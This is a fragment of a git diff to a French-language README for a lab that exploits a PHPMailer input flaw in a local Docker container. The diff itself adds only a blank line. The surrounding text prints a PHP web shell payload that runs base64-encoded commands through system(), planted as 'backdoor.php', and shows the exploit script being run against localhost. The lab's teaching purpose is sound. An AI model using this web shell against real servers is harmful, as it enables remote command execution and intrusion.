@@ -18,6 +18,7 @@ Lorsque l'image soit lancé sur le conteneur docker, visiter localhost:8080
 ![](index.png)
 
 Étape 2: Lancement du script "exploit.sh", ce dernier injecte le malicious code ``` <?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>``` dans le serveur distant (dans notre cas ça sera "localhost:8080", puisque l'application est exécuté sur un container docker locale) sous la forme d'un fichier php que nous avons l'appelé "backdoor.php" en exploitant La faille de PHPMailer qui ne vérifier pas les données envoyées par l'utilisateur à travers le formulaire avant l'exécution, et par conséquent il va nous donner la possibilité d'éxécuter des commandes à distance à travers ce script injecté (Remot shell).
+
 Remarque: au lieu de proceder manuellement avec la saisie directement sur le formulaire, on va utiliser deux scripts qui vont faciliter la tache.
 ```
 $ bash exploit.sh localhost:8080
